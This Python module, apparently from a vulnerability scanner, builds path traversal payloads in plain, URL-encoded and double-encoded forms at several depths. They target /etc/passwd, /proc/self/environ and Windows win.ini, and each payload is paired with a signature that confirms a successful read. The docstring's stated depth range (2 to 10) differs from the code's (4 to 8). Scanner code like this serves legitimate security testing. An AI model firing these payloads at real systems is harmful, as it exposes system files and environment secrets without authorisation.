"""경로 순회 / 파일 다운로드 페이로드 카탈로그.

설계 원칙: 거짓 양성 위험이 거의 없는 시스템 파일 시그니처에만 의존한다.
- Linux: `/etc/passwd` 의 `root:x:0:0` (깊이 2~10, 인코딩 3종)
- Linux 우회: `/etc` 가 차단된 경우 `/proc/self/environ` 의 `PATH=`
- Windows: `win.ini` 의 `[fonts]` / `[extensions]` (깊이 2~10, 절대경로)
"""
from __future__ import annotations

from dataclasses import dataclass

from attacker_module_3.common.result import Confidence


@dataclass(frozen=True)
class PathPayload:
    value: str
    category: str
    signatures: tuple[bytes, ...]
    confidence: Confidence


_PASSWD_SIG = (b"root:x:0:0",)
_WIN_INI_SIG = (b"[fonts]", b"[extensions]")

# 깊이 범위: 4~8 (4부터면 깊이 1~4를 한번에 커버, 8이면 대부분의 환경 대응)
_DEPTHS = range(4, 9)


def _build_payloads() -> tuple[PathPayload, ...]:
    payloads: list[PathPayload] = []

    for depth in _DEPTHS:
        plain    = "../" * depth
        urlenc   = "..%2f" * depth
        dblenc   = "..%252f" * depth
        win_back = "..\\" * depth

        # Linux /etc/passwd — plain
        payloads.append(PathPayload(
            value=f"{plain}etc/passwd",
            category=f"nix-passwd-d{depth}",
            signatures=_PASSWD_SIG,
            confidence=Confidence.HIGH,
        ))
        # Linux /etc/passwd — URL 인코딩
        payloads.append(PathPayload(
            value=f"{urlenc}etc%2fpasswd",
            category=f"nix-passwd-urlenc-d{depth}",
            signatures=_PASSWD_SIG,
            confidence=Confidence.HIGH,
        ))
        # Linux /etc/passwd — 이중 URL 인코딩
        payloads.append(PathPayload(
            value=f"{dblenc}etc%2fpasswd",
            category=f"nix-passwd-dblenc-d{depth}",
            signatures=_PASSWD_SIG,
            confidence=Confidence.HIGH,
        ))
        # Linux /proc/self/environ
        payloads.append(PathPayload(
            value=f"{plain}proc/self/environ",
            category=f"nix-proc-environ-d{depth}",
            signatures=(b"PATH=",),
            confidence=Confidence.MEDIUM,
        ))
        # Windows win.ini — 백슬래시
        payloads.append(PathPayload(
            value=f"{win_back}windows\\win.ini",
            category=f"windows-win-ini-d{depth}",
            signatures=_WIN_INI_SIG,
            confidence=Confidence.HIGH,
        ))

    # 절대경로 (깊이 무관)
    payloads.append(PathPayload(
        value="/etc/passwd",
        category="nix-passwd-absolute",
        signatures=_PASSWD_SIG,
        confidence=Confidence.HIGH,
    ))
    payloads.append(PathPayload(
        value="C:\\Windows\\win.ini",
        category="windows-win-ini-absolute",
        signatures=_WIN_INI_SIG,
        confidence=Confidence.HIGH,
    ))

    return tuple(payloads)


PAYLOADS: tuple[PathPayload, ...] = _build_payloads()
